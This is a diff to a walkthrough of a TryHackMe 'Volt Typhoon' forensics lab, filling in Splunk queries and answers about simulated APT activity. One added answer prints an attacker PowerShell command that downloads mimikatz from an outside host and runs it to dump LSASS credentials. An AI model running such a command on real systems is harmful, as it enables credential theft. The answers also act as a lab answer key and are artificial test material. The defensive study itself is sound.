@@ -1,4 +1,7 @@
 # Volt Typhoon Writeup
+
+<img width="600" height="600" alt="image" src="https://github.com/user-attachments/assets/183b1c1d-01fb-4656-9d3f-d4e719d82915" />
+
 ### Lab Link [Volt Typhoon](https://tryhackme.com/room/volttyphoon)
 ## Scenario
 ```
@@ -204,8 +207,25 @@ you will see 8 events, by invesitage them you can find the answer
 Answer: `OpenSSH, putty, realvnc`
 
 ### Q2: What is the full decoded command the attacker uses to download and run mimikatz?
+using the query I used before to search for commands
+- index=main | stats count by CommandLine
 
-Answer: ``
+and I found answer here 
+
+![main](Images/20.png) 
+
+then investigate more to see the command
+
+![main](Images/21.png) 
+
+you will see that it's encoded by base64 
+
+you can use [cyber chef](https://cyberchef.org/) to decode
+
+![main](Images/22.png) 
+
+
+Answer: `Invoke-WebRequest -Uri “http://voltyp.com/3/tlz/mimikatz.exe" -OutFile “C:\Temp\db2\mimikatz.exe”; Start-Process -FilePath “C:\Temp\db2\mimikatz.exe” -ArgumentList @(“sekurlsa::minidump lsass.dmp”, “exit”) -NoNewWindow -Wait`
 
 
 ## Task 7 : Discovery & Lateral Movement
@@ -221,11 +241,26 @@ This technique facilitates their ability to traverse through networks and mainta
 ### Q1: The attacker uses wevtutil, a log retrieval tool, to enumerate Windows logs. What event IDs does the attacker search for?
 Answer Format: Increasing order separated by a space.
 
-Answer: ``
+by involving wevtutil in query you will show the answer 
+
+- index=main  wevtutil
+
+![main](Images/23.png) 
+
+Answer: `4624 4625 4769`
 
 ### Q2: Moving laterally to server-02, the attacker copies over the original web shell. What is the name of the new web shell that was created?
 
-Answer: ``
+by searching for *server-02* you will find those evnets
+
+![main](Images/24.png) 
+
+by checking this command
+
+![main](Images/25.png) 
+
+
+Answer: `AuditReport.jspx`
 
 
 ## Task 8 : Collection
@@ -236,7 +271,17 @@ such as local web browser information and valuable assets discovered within the 
 
 ### Q1: The attacker is able to locate some valuable financial information during the collection phase. What three files does Volt Typhoon make copies of using PowerShell? Answer Format: Increasing order separated by a space.
 
-Answer: ``
+I filtered by powershell to search for copy command 
+
+- index=main  powershell | stats count by CommandLine
+
+![main](Images/26.png)
+  
+Then, click "View Events" to display all related events and search for files related to financial data.
+
+![main](Images/27.png)
+
+Answer: `2022.csv 2023.csv 2024.csv`
 
 ## Task 9 : C2 & Cleanup
 ```
@@ -249,11 +294,30 @@ To cover their tracks, the APT has been observed deleting event logs and selecti
 ### Q1: The attacker uses netsh to create a proxy for C2 communications. What connect address and port does the attacker use when setting up the proxy?
 Answer Format: IP Port
 
-Answer: ``
+I filtered the logs using "netsh" to find commands executed with it.
+
+- index=main  netsh
+
+![main](Images/28.png)
+
+
+Answer: `10.2.30.1 8443`
+
+
+
 
 ### Q2: To conceal their activities, what are the four types of event logs the attacker clears on the compromised system?
 
-Answer: ``
+The tool used to manage events in Task 7 is wevtutil, which can be used to filter logs and analyze system activity.
+
+- index=main  wevtutil
+
+![main](Images/29.png)
+
+
+Answer: `Application Security Setup System`
+
+
 
 ## The End 
 # I hope you find it useful.
